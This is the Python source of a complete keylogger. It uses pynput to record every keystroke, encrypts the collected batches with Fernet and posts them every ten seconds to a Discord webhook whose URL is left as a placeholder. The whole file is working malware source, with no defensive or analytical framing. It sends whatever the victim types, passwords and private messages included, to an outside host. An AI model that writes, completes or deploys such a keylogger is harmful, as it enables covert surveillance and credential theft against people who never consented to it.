from cryptography.fernet import Fernet
from pynput import keyboard
import requests
import os
import threading
import time

# Generate or load the encryption key
key_file = "encryption_key.key"

if os.path.exists(key_file):
    with open(key_file, "rb") as f:
        key = f.read()
    cipher = Fernet(key)
else:
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
    print("Encryption key generated and saved as 'encryption_key.key'")
    cipher = Fernet(key)

# Discord Webhook URL
discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

# Buffer to collect keystrokes
keystroke_buffer = []
BUFFER_SIZE = 50  # Send message when 50 keystrokes are collected
TIME_INTERVAL = 10  # Send message every 10 seconds, even if buffer is not full


def send_to_discord():
    """Send the buffered keystrokes to Discord as encrypted data."""
    last_sent_time = time.time()

    while True:
        try:
            current_time = time.time()
            if len(keystroke_buffer) >= BUFFER_SIZE or (current_time - last_sent_time) >= TIME_INTERVAL:
                # Prepare the message content
                message_content = "".join(keystroke_buffer)

                # Encrypt the message content
                encrypted_content = cipher.encrypt(message_content.encode()).decode()

                # Send to Discord
                payload = {"content": f"**Encrypted Keystrokes Logged:**\n```\n{encrypted_content}\n```"}
                response = requests.post(discord_webhook_url, json=payload)

                if response.status_code == 204:
                    # Clear the buffer after sending
                    keystroke_buffer.clear()
                    last_sent_time = current_time
                else:
                    print(f"Failed to send to Discord: {response.status_code}, {response.text}")

        except Exception as e:
            print(f"Error sending to Discord: {e}")
        time.sleep(1)


def on_press(key):
    """Log each keystroke and add it to the buffer."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke = key.char  # Character keys
        else:
            keystroke = f"[{key}]"  # Special keys (e.g., [Shift], [Ctrl])

        # Decode to string if bytes and append to buffer
        if isinstance(keystroke, bytes):
            keystroke_buffer.append(keystroke.decode(errors="ignore"))
        else:
            keystroke_buffer.append(keystroke)
    except Exception as e:
        print(f"Error logging key press: {e}")


def main():
    """Main function to start the keylogger and sending thread."""
    # Start the Discord-sending thread
    threading.Thread(target=send_to_discord, daemon=True).start()

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()